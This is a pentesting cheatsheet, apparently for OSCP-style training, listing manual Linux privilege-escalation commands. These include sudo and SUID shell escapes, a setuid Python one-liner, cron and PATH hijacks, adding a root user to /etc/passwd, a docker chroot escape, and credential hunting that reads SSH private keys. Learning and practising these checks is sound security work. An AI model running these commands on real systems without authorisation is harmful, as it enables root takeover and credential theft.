---
name: Linux PrivEsc Checklist
category: Cheatsheets & Playbooks
description: Manual local privilege escalation checks for Linux — SUID, sudo, cron, more.
tags: [privesc, linux, suid, sudo, gtfobins, enumeration, oscp]
---

# Linux PrivEsc Checklist

A manual checklist for escalating from a low-privilege shell to root on Linux. Run [linPEAS](#/tool/peass) for the automated pass, but knowing these by hand tells you what its output means.

> After landing a shell, upgrade to a TTY first (see [Reverse Shells](#/tool/reverse-shells)). Then work top to bottom.

## Quick context

```bash
id; whoami; hostname
uname -a; cat /etc/os-release          # kernel + distro (for kernel exploits)
sudo -l                                 # what can we run as sudo? (huge)
cat /etc/passwd | cut -d: -f1           # users
ls -la /home/*/ 2>/dev/null
history; cat ~/.bash_history 2>/dev/null
env                                      # secrets in environment?
```

## sudo rights (check first — fastest win)

```bash
sudo -l
```

Any allowed binary → check **GTFOBins** (gtfobins.github.io) for a shell escape. Classics:

```bash
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile        # then: !/bin/sh
sudo env /bin/sh
# NOPASSWD entries, sudo version CVEs (e.g. Baron Samedit), and LD_PRELOAD if env_keep+ set
```

## SUID / SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

Cross-reference each non-standard SUID binary with GTFOBins:

```bash
./binary          # some drop a shell keeping euid=0
# e.g. cp, find, nmap(old), bash -p, systemctl, env, vim.basic
/bin/bash -p       # if bash is SUID
```

## Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid on python/perl -> instant root:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # needs cap_setuid+ep
```

## Cron jobs

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
cat /etc/cron.d/* 2>/dev/null
grep -R "CRON" /var/log/syslog 2>/dev/null    # see what runs, as who
```

Look for scripts you can write to that run as root, or wildcard/PATH abuse in them.

## Writable files & PATH hijack

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'
ls -la /etc/passwd /etc/shadow /etc/sudoers   # writable = game over
# Writable /etc/passwd -> add a root user:
openssl passwd -1 -salt x pass123             # make a hash, then append:
echo 'hacker:HASH:0:0::/root:/bin/bash' >> /etc/passwd
# Relative-path binary called by a root script -> hijack $PATH
echo -e '#!/bin/sh\n/bin/bash -p' > /tmp/service; chmod +x /tmp/service; export PATH=/tmp:$PATH
```

## Services, kernel, containers

```bash
ps aux --forest                          # root processes / internal services
netstat -tlnp 2>/dev/null || ss -tlnp    # local-only services to pivot to
searchsploit linux kernel $(uname -r)    # kernel exploits (last resort)
id | grep -q docker && echo "docker group -> root via container mount"
mount | grep -i nfs                       # no_root_squash NFS shares
```

Docker group → root:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Credential hunting

```bash
grep -RiE 'password|passwd|secret|api[_-]?key' /var/www /opt /home 2>/dev/null
find / -name "*.bak" -o -name "id_rsa" -o -name "*.kdbx" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null; cat /root/.ssh/id_rsa 2>/dev/null
find / -name "config*.php" 2>/dev/null -exec grep -i pass {} \;
```

> Order that usually pays off: `sudo -l` → SUID/GTFOBins → capabilities → cron/writable → credentials → kernel exploit last. Automate discovery with [linPEAS](#/tool/peass); confirm kernel/software CVEs with [searchsploit](#/tool/searchsploit). Companion: [Windows PrivEsc](#/tool/privesc-windows).
